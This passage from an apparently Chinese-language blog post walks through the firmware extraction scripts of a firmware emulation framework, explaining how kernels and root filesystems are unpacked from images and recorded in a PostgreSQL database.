class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] <span class="variable">$&#123;1&#125;</span> emulation start!!!&quot;</span></span><br><span class="line">INFILE=<span class="variable">$&#123;1&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;BRAND&#125;</span></span><br><span class="line">BRAND=`get_brand <span class="variable">$&#123;INFILE&#125;</span> <span class="variable">$&#123;BRAND&#125;</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;BRAND&#125;</span></span><br><span class="line">FILENAME=`basename <span class="variable">$&#123;INFILE%.*&#125;</span>`</span><br><span class="line">PING_RESULT=<span class="literal">false</span></span><br><span class="line">WEB_RESULT=<span class="literal">false</span></span><br><span class="line">IP=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;BRAND&#125;</span> = <span class="string">&quot;auto&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[\033[31m-\033[0m] Invalid brand <span class="variable">$&#123;INFILE&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;PSQL_IP&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$&#123;FIRMAE_DOCKER-&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> ( ! ./scripts/util.py check_connection _ <span class="variable">$PSQL_IP</span> ); <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[\033[31m-\033[0m] docker container failed to connect to the hosts&#x27; postgresql!&quot;</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>这一段主要是获取品牌名称以及检查与<code>psql</code>的连接</p><p>然后就是利用<code>extractor.py</code>去提取内核以及文件系统，将其打包在<code>images</code>目录下，文件系统命名为<code>IID.tar.gz</code>,而内核命名为<code>IID.kernel</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="comment"># extract filesystem from firmware</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line">t_start=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">timeout --preserve-status --signal SIGINT 300 \</span><br><span class="line">    ./sources/extractor/extractor.py -b <span class="variable">$BRAND</span> -sql <span class="variable">$PSQL_IP</span> -np -nk <span class="variable">$INFILE</span> images \</span><br><span class="line">    2&gt;&amp;1 &gt;/dev/null</span><br><span class="line"></span><br><span class="line">IID=`./scripts/util.py get_iid <span class="variable">$INFILE</span> <span class="variable">$PSQL_IP</span>`</span><br><span class="line"><span class="keyword">if</span> [ ! <span class="string">&quot;<span class="variable">$&#123;IID&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[\033[31m-\033[0m] extractor.py failed!&quot;</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#================================</span></span><br><span class="line"><span class="comment">#extract kernel from firmware</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line">timeout --preserve-status --signal SIGINT 300 \</span><br><span class="line">    ./sources/extractor/extractor.py -b <span class="variable">$BRAND</span> -sql <span class="variable">$PSQL_IP</span> -np -nf <span class="variable">$INFILE</span> images \</span><br><span class="line">    2&gt;&amp;1 &gt;/dev/null</span><br></pre></td></tr></table></figure><h2 id="提取模块"><a href="#提取模块" class="headerlink" title="提取模块"></a>提取模块</h2><p>我们仔细分析一下这个<code>extractor</code>的行为，主要是将参数传入，然后调用<code>extract.extract()</code>函数进行提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Extracts filesystem and \</span></span><br><span class="line"><span class="string">        kernel from Linux-based firmware images&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;input&quot;</span>, action=<span class="string">&quot;store&quot;</span>, help=<span class="string">&quot;Input file or directory&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;output&quot;</span>, action=<span class="string">&quot;store&quot;</span>, nargs=<span class="string">&quot;?&quot;</span>, default=<span class="string">&quot;images&quot;</span>,</span><br><span class="line">                        help=<span class="string">&quot;Output directory for extracted firmware&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-sql &quot;</span>, dest=<span class="string">&quot;sql&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="literal">None</span>,</span><br><span class="line">                        help=<span class="string">&quot;Hostname of SQL server&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-nf&quot;</span>, dest=<span class="string">&quot;rootfs&quot;</span>, action=<span class="string">&quot;store_false&quot;</span>,</span><br><span class="line">                        default=<span class="literal">True</span>, help=<span class="string">&quot;Disable extraction of root \</span></span><br><span class="line"><span class="string">                        filesystem (may decrease extraction time)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-nk&quot;</span>, dest=<span class="string">&quot;kernel&quot;</span>, action=<span class="string">&quot;store_false&quot;</span>,</span><br><span class="line">                        default=<span class="literal">True</span>, help=<span class="string">&quot;Disable extraction of kernel \</span></span><br><span class="line"><span class="string">                        (may decrease extraction time)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-np&quot;</span>, dest=<span class="string">&quot;parallel&quot;</span>, action=<span class="string">&quot;store_false&quot;</span>,</span><br><span class="line">                        default=<span class="literal">True</span>, help=<span class="string">&quot;Disable parallel operation \</span></span><br><span class="line"><span class="string">                        (may increase extraction time)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-b&quot;</span>, dest=<span class="string">&quot;brand&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="literal">None</span>,</span><br><span class="line">                        help=<span class="string">&quot;Brand of the firmware image&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-d&quot;</span>, dest=<span class="string">&quot;debug&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        help=<span class="string">&quot;Print debug information&quot;</span>)</span><br><span class="line">    result = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> psql_check(result.sql):</span><br><span class="line">        extract = Extractor(result.input, result.output, result.rootfs,</span><br><span class="line">                            result.kernel, result.parallel, result.sql,</span><br><span class="line">                            result.brand, result.debug)</span><br><span class="line">        extract.extract()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>extract</code>是类<code>Extractor</code>实例化的一个对象</p><p>其定义如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Extractor</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Class that extracts kernels and filesystems from firmware images, given an</span></span><br><span class="line"><span class="string">    input file or directory and output directory.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Directories that define the root of a UNIX filesystem, and the</span></span><br><span class="line">    <span class="comment"># appropriate threshold condition</span></span><br><span class="line">    UNIX_DIRS = [<span class="string">&quot;bin&quot;</span>, <span class="string">&quot;etc&quot;</span>, <span class="string">&quot;dev&quot;</span>, <span class="string">&quot;home&quot;</span>, <span class="string">&quot;lib&quot;</span>, <span class="string">&quot;mnt&quot;</span>, <span class="string">&quot;opt&quot;</span>, <span class="string">&quot;root&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;run&quot;</span>, <span class="string">&quot;sbin&quot;</span>, <span class="string">&quot;tmp&quot;</span>, <span class="string">&quot;usr&quot;</span>, <span class="string">&quot;var&quot;</span>]</span><br><span class="line">    UNIX_THRESHOLD = <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Lock to prevent concurrent access to visited set. Unfortunately, must be</span></span><br><span class="line">    <span class="comment"># static because it cannot be pickled or passed as instance attribute.</span></span><br><span class="line">    visited_lock = multiprocessing.Lock()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, indir, outdir=None, rootfs=True, kernel=True,</span></span></span><br><span class="line"><span class="function"><span class="params">                 numproc=True, server=None, brand=None, debug=False</span>):</span></span><br><span class="line">        <span class="comment"># Input firmware update file or directory</span></span><br><span class="line">        self._input = os.path.abspath(indir)</span><br><span class="line">        <span class="comment"># Output firmware directory</span></span><br><span class="line">        self.output_dir = os.path.abspath(outdir) <span class="keyword">if</span> outdir <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Whether to attempt to extract kernel</span></span><br><span class="line">        self.do_kernel = kernel</span><br><span class="line">        self.kernel_done = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Whether to attempt to extract root filesystem</span></span><br><span class="line">        self.do_rootfs = rootfs</span><br><span class="line">        self.rootfs_done = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Brand of the firmware</span></span><br><span class="line">        self.brand = brand</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Hostname of SQL server</span></span><br><span class="line">        self.database = server</span><br><span class="line"></span><br><span class="line">        self.debug = debug</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Worker pool.</span></span><br><span class="line">        self._pool = multiprocessing.Pool() <span class="keyword">if</span> numproc <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Set containing MD5 checksums of visited items</span></span><br><span class="line">        self.visited = dict()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># List containing tagged items to extract as 2-tuple: (tag [e.g. MD5],</span></span><br><span class="line">        <span class="comment"># path)</span></span><br><span class="line">        self._list = list()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getstate__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Eliminate attributes that should not be pickled.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self_dict = self.__dict__.copy()</span><br><span class="line">        <span class="keyword">del</span> self_dict[<span class="string">&quot;_pool&quot;</span>]</span><br><span class="line">        <span class="keyword">del</span> self_dict[<span class="string">&quot;_list&quot;</span>]</span><br><span class="line">        <span class="keyword">return</span> self_dict</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们逐一解释其主要的函数</p><p><code>io_dd</code>函数，就是将<code>indir</code>文件指针移动至到文件头偏移<code>offset</code>位置然后再将其输出(通俗讲就是把input文件的前offset字节裁掉然后输出)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_dd</span>(<span class="params">indir, offset, size, outdir</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given a path to a target file, extract size bytes from specified offset</span></span><br><span class="line"><span class="string">    to given output file.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> size:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(indir, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> ifp:</span><br><span class="line">        <span class="keyword">with</span> open(outdir, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> ofp:</span><br><span class="line">            ifp.seek(offset, <span class="number">0</span>)</span><br><span class="line">            ofp.write(ifp.read(size))</span><br></pre></td></tr></table></figure><p><code>magic</code>函数，通过python的magic库读取文件的格式并返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>(<span class="params">indata, mime=False</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Performs file magic while maintaining compatibility with different</span></span><br><span class="line"><span class="string">    libraries.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> mime:</span><br><span class="line">            mymagic = magic.open(magic.MAGIC_MIME_TYPE)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mymagic = magic.open(magic.MAGIC_NONE)</span><br><span class="line">        mymagic.load()</span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        mymagic = magic.Magic(mime)</span><br><span class="line">        mymagic.file = mymagic.from_file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> mymagic.file(indata)</span><br><span class="line">    <span class="keyword">except</span> magic.MagicException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p><code>io_md5</code>函数，把<code>target</code>文件给哈希了返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_md5</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Performs MD5 with a block size of 64kb.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    blocksize = <span class="number">65536</span></span><br><span class="line">    hasher = hashlib.md5()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(target, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> ifp:</span><br><span class="line">        buf = ifp.read(blocksize)</span><br><span class="line">        <span class="keyword">while</span> buf:</span><br><span class="line">            hasher.update(buf)</span><br><span class="line">            buf = ifp.read(blocksize)</span><br><span class="line">        <span class="keyword">return</span> hasher.hexdigest()</span><br></pre></td></tr></table></figure><p><code>io_rm</code>函数，调用<code>shutil.rmtree</code>函数来递归的删除target目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_rm</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Attempts to recursively delete a directory.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    shutil.rmtree(target, ignore_errors=<span class="literal">True</span>, onerror=Extractor._io_err)</span><br><span class="line"></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_io_err</span>(<span class="params">function, path, excinfo</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Internal function used by &#x27;_rm&#x27; to print out errors.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    print((<span class="string">&quot;!! %s: Cannot delete %s!\n%s&quot;</span> % (function, path, excinfo)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>io_find_rootfs</code>函数，来判断提取的目录是否是linux 根目录。首先通过wile循环来递归进一个目录串，直到递归达到为一个单个目录，并且该目录下有其他的文件(不是还能继续递归进目录的那种)</p><p>然后判断目录下的子目录名是否有<code>[&quot;bin&quot;, &quot;etc&quot;, &quot;dev&quot;, &quot;home&quot;, &quot;lib&quot;, &quot;mnt&quot;, &quot;opt&quot;, &quot;root&quot;, &quot;run&quot;, &quot;sbin&quot;, &quot;tmp&quot;, &quot;usr&quot;, &quot;var&quot;]</code>这类linux根目录的目录关键词，然后包含的个数来判断是不是一个linux根目录(好直接)。如果需要递归的话则对子目录进行递归调用<code>io_find_rootfs</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">io_find_rootfs</span>(<span class="params">start, recurse=True</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Attempts to find a Linux root directory.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Recurse into single directory chains, e.g. jffs2-root/fs_1/.../</span></span><br><span class="line">    path = start</span><br><span class="line">    <span class="keyword">while</span> (len(os.listdir(path)) == <span class="number">1</span> <span class="keyword">and</span></span><br><span class="line">            os.path.isdir(os.path.join(path, os.listdir(path)[<span class="number">0</span>]))):</span><br><span class="line">        path = os.path.join(path, os.listdir(path)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># count number of unix-like directories</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> subdir <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">        <span class="keyword">if</span> subdir <span class="keyword">in</span> Extractor.UNIX_DIRS <span class="keyword">and</span> \</span><br><span class="line">            os.path.isdir(os.path.join(path, subdir)) <span class="keyword">and</span> \</span><br><span class="line">                len(os.listdir(os.path.join(path, subdir))) &gt; <span class="number">0</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check for extracted filesystem, otherwise update queue</span></span><br><span class="line">    <span class="keyword">if</span> count &gt;= Extractor.UNIX_THRESHOLD:</span><br><span class="line">        <span class="keyword">return</span> (<span class="literal">True</span>, path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># in some cases, multiple filesystems may be extracted, so recurse to</span></span><br><span class="line">    <span class="comment"># find best one</span></span><br><span class="line">    <span class="keyword">if</span> recurse:</span><br><span class="line">        <span class="keyword">for</span> subdir <span class="keyword">in</span> os.listdir(path):</span><br><span class="line">            <span class="keyword">if</span> os.path.isdir(os.path.join(path, subdir)):</span><br><span class="line">                res = Extractor.io_find_rootfs(os.path.join(path, subdir),</span><br><span class="line">                                                <span class="literal">False</span>)</span><br><span class="line">                <span class="keyword">if</span> res[<span class="number">0</span>]:</span><br><span class="line">                    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">False</span>, start)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>extract</code>函数，这里就对单个input函数而不是整个目录进行说明。把需要提取的item放进_list中，然后对_list中所有item调用<code>\_extract\_item</code>进行提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Perform extraction of firmware updates from input to tarballs in output</span></span><br><span class="line"><span class="string">    directory using a thread pool.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(self._input):</span><br><span class="line">        <span class="keyword">for</span> path, _, files <span class="keyword">in</span> os.walk(self._input):</span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> files:</span><br><span class="line">                self._list.append(os.path.join(path, item))</span><br><span class="line">    <span class="keyword">elif</span> os.path.isfile(self._input):</span><br><span class="line">        self._list.append(self._input)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.output_dir <span class="keyword">and</span> <span class="keyword">not</span> os.path.isdir(self.output_dir):</span><br><span class="line">        os.makedirs(self.output_dir)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self._pool:</span><br><span class="line">        <span class="comment"># since we have to handle multiple files in one firmware image, it</span></span><br><span class="line">        <span class="comment"># is better to use chunk_size=1</span></span><br><span class="line">        chunk_size = <span class="number">1</span></span><br><span class="line">        list(self._pool.imap_unordered(self._extract_item, self._list,</span><br><span class="line">                                        chunk_size))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> self._list:</span><br><span class="line">            self._extract_item(item)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_extract_item</span>(<span class="params">self, path</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Wrapper function that creates an ExtractionItem and calls the extract()</span></span><br><span class="line"><span class="string">    method.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    ExtractionItem(self, path, <span class="number">0</span>, <span class="literal">None</span>, self.debug).extract()</span><br></pre></td></tr></table></figure><p>嗯，看来关键类是<code>ExtractionItem</code>,我们再来分析一下这个类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExtractionItem</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Class that encapsulates the state of a single item that is being extracted.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Maximum recursion breadth and depth</span></span><br><span class="line">    RECURSION_BREADTH = <span class="number">10</span></span><br><span class="line">    RECURSION_DEPTH = <span class="number">3</span></span><br><span class="line">    database = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, extractor, path, depth, tag=None, debug=False</span>):</span></span><br><span class="line">        <span class="comment"># Temporary directory</span></span><br><span class="line">        self.temp = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Recursion depth counter</span></span><br><span class="line">        self.depth = depth</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Reference to parent extractor object</span></span><br><span class="line">        self.extractor = extractor</span><br><span class="line"></span><br><span class="line">        <span class="comment"># File path</span></span><br><span class="line">        self.item = path</span><br><span class="line"></span><br><span class="line">        self.debug = debug</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Database connection</span></span><br><span class="line">        <span class="keyword">if</span> self.extractor.database:</span><br><span class="line">            <span class="keyword">import</span> psycopg2</span><br><span class="line">            self.database = psycopg2.connect(database=<span class="string">&quot;firmware&quot;</span>,</span><br><span class="line">                                             user=<span class="string">&quot;firmadyne&quot;</span>,</span><br><span class="line">                                             password=<span class="string">&quot;firmadyne&quot;</span>,</span><br><span class="line">                                             host=self.extractor.database)</span><br><span class="line">            